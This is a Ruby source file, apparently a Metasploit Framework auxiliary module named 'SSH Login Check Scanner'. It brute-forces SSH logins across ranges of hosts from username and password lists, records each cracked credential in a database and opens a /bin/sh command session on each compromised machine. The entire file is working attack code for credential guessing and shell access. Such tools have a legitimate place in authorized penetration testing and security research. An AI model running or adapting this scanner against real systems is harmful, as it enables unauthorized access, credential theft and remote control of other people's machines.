##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell

  def initialize
    super(
      'Name'        => 'SSH Login Check Scanner',
      'Description' => %q{
        This module will test ssh logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'      => ['todb'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

    deregister_options('RHOST')

  end

  def rport
    datastore['RPORT']
  end

  def session_setup(result, ssh_socket)
    return unless ssh_socket

    # Create a new session
    conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => result.credential.public,
      'PASSWORD'      => result.credential.private
    }
    info = "#{proto_from_fullname} #{result.credential} (#{@ip}:#{rport})"
    s = start_session(self, info, merge_me, false, conn.lsock)

    # Set the session platform
    case result.proof
    when /Linux/
      s.platform = "linux"
    when /Darwin/
      s.platform = "osx"
    when /SunOS/
      s.platform = "solaris"
    when /BSD/
      s.platform = "bsd"
    when /HP-UX/
      s.platform = "hpux"
    when /AIX/
      s.platform = "aix"
    when /Win32|Windows/
      s.platform = "windows"
    when /Unknown command or computer name/
      s.platform = "cisco-ios"
    end

    s
  end

  def do_report(ip,port,result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    @ip = ip
    print_brute :ip => ip, :msg => "Starting bruteforce"

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: datastore['SSH_TIMEOUT'],
    )

    scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        do_report(ip,rport,result)
        session_setup(result, scanner.ssh_socket)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        else
          invalidate_login(
              address: ip,
              port: rport,
              protocol: 'tcp',
              public: result.credential.public,
              private: result.credential.private,
              realm_key: result.credential.realm_key,
              realm_value: result.credential.realm,
              status: result.status
          )
          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end

end
